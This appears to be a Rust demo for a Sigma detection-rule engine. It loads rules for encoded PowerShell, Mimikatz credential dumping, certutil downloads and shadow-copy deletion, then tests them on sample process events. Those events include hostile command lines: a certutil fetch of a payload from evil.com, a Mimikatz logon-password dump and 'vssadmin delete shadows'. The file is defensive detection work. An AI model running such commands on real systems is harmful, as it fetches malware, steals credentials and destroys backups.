//! Quick live demo: multi-rule engine, mixed events, severity routing

use null_sigma::SigmaEngine;
use std::collections::HashMap;

const RULES: &str = r#"
title: Encoded PowerShell
id: demo-0001
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  enc_ps:
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
  condition: enc_ps
level: high
tags: [attack.execution, attack.t1059.001]
---
title: Credential Dump via Mimikatz
id: demo-0002
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  mimi:
    CommandLine|contains:
      - 'sekurlsa::logonpasswords'
      - 'lsadump::sam'
  condition: mimi
level: critical
tags: [attack.credential_access, attack.t1003.001]
---
title: Suspicious Certutil Usage
id: demo-0003
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  certutil_download:
    Image|endswith: '\certutil.exe'
    CommandLine|contains: '-urlcache'
  condition: certutil_download
level: medium
tags: [attack.command_and_control, attack.t1105]
---
title: Ransomware Shadow Delete
id: demo-0004
status: stable
logsource: {}
detection:
  shadow:
    CommandLine|contains: 'vssadmin delete shadows'
  condition: shadow
level: critical
tags: [attack.impact, attack.t1490]
---
title: Generic Process Watch (low noise)
id: demo-0005
status: experimental
logsource:
  category: process_creation
detection:
  low:
    Image|endswith:
      - '\wscript.exe'
      - '\cscript.exe'
  condition: low
level: low
---
"#;

fn event(pairs: &[(&str, &str)]) -> HashMap<String, String> {
    pairs
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect()
}

fn main() {
    let mut engine = SigmaEngine::new();
    let (loaded, errors) = engine.load_rules(RULES);
    println!(
        "=== Engine loaded: {} rules, {} errors ===\n",
        loaded.len(),
        errors.len()
    );

    let test_events = vec![
        (
            "notepad.exe",
            event(&[
                ("Image", "C:\\Windows\\System32\\notepad.exe"),
                ("CommandLine", "notepad.exe report.txt"),
                ("category", "process_creation"),
                ("product", "windows"),
            ]),
        ),
        (
            "mimikatz",
            event(&[
                ("Image", "C:\\temp\\m64.exe"),
                ("CommandLine", "m64.exe sekurlsa::logonpasswords"),
                ("category", "process_creation"),
                ("product", "windows"),
            ]),
        ),
        (
            "certutil LOLBin",
            event(&[
                ("Image", "C:\\Windows\\System32\\certutil.exe"),
                (
                    "CommandLine",
                    "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
                ),
                ("category", "process_creation"),
                ("product", "windows"),
            ]),
        ),
        (
            "shadow delete",
            event(&[
                ("CommandLine", "cmd /c vssadmin delete shadows /all /quiet"),
                ("category", "process_creation"),
            ]),
        ),
        (
            "encoded ps",
            event(&[
                ("CommandLine", "powershell.exe -EncodedCommand SQBFAFgA"),
                (
                    "Image",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                ),
                ("category", "process_creation"),
                ("product", "windows"),
            ]),
        ),
    ];

    for (label, ev) in &test_events {
        let matches = engine.evaluate_event(ev);
        if matches.is_empty() {
            println!("[CLEAN]  {label}");
        } else {
            for m in &matches {
                let score = m.rule_level.to_score();
                let bar = "#".repeat((score * 20.0) as usize);
                println!(
                    "[ALERT]  {label:<22} │ {:8} │ score {score:.2} {bar}",
                    m.rule_level.as_str().to_uppercase()
                );
                println!("         rule: {}", m.rule_title);
                println!("         tags: {}\n", m.tags.join(", "));
            }
        }
    }

    // Batch throughput estimate
    let batch: Vec<_> = std::iter::repeat_with(|| test_events[4].1.clone())
        .take(10_000)
        .collect();
    let t0 = std::time::Instant::now();
    let results = engine.evaluate_batch(&batch);
    let elapsed = t0.elapsed();
    let hits: usize = results.iter().map(|r| r.matches.len()).sum();
    println!(
        "=== Batch: 10,000 events in {elapsed:?} → {} total rule hits ===",
        hits
    );
    println!(
        "    throughput: {:.0}k events/sec",
        10_000.0 / elapsed.as_secs_f64() / 1000.0
    );
}
